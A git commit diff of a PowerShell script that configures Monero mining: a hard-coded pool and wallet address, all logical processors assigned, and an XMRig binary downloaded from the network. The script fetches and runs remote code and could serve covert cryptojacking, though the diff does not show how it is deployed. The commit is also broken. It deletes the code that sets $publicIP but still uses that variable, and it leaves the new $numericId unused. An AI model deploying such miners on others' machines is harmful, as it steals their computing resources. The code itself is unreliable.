fe61d417a9137d7453ed3b767c1dfdc9023fb270
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2025-02-08 15:04:00 +0100

    Update windows.ps1

--- monero/windows.ps1
+++ monero/windows.ps1
@@ -2,13 +2,11 @@ $algo = "rx/0"
 $pool = "gulf.moneroocean.stream:10001"
 $user = "45MBTQ27xo1LJmAi6sNFTyZhgTdoF45XCRsLUtmL7Lo376nNuxcaSxAa3JUkUV4xHEVSpsEA6nwL5S28g1fCa1RwPfXpwnH"
 
-try {
-    $publicIP = (Invoke-WebRequest -Uri "https://api64.ipify.org").Content
-} catch {
-    $publicIP = (New-Guid).Guid.Substring(0, 8)
-}
+$uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID.Replace("-", "")
+$hash = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid))
+$numericId = [BitConverter]::ToUInt32($hash, 0) % 1000000000000
 
-$pass = "Windows-$publicIP"
+$pass = "Rig-w-$publicIP"
 $threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
 
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
